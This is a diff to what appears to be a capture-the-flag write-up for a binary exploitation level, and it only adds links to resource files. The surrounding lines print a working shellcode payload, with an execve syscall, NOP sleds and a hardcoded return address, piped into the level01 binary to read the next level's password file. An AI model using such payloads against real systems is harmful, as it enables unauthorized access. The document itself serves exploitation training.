@@ -247,7 +247,7 @@ Shellcode injection consists of an execve syscall to run a binary at /tmp/a loca
     int    0x80 
     """
 
-To gain access to the next level we can write a simple program that will print the level02 password's file contents to the standard output:
+To gain access to the next level we can write a [simple program](Ressources/main.c) that will print the level02 password's file contents to the standard output:
 
     int main()
     {  
@@ -261,7 +261,7 @@ To gain access to the next level we can write a simple program that will print t
     printf("\n\n%s\n\n",buff);
     }
 
-Now we need to compile this program and place it at the /tmp/a location, after that we can generate command to exploit the binary using the pawner script and execute it:
+Now we need to compile this program and place it at the /tmp/a location, after that we can generate command to exploit the binary using the [pawner script](Ressources/pwner.py) and execute it:
 
     $ gcc -m32 /tmp/main.c -o /tmp/a
     $ python -c 'print(b"dat_will\n\x90\x90\x90\x90\x90\x90\x90\x90\x2f\x74\x6d\x70\x2f\x61\x00\xb8\x0b\x00\x00\x00\xbb\xb4\xdd\xff\xff\x31\xc9\x89\xca\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xdd\xff\xff")' | env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53 /home/users/level01/level01
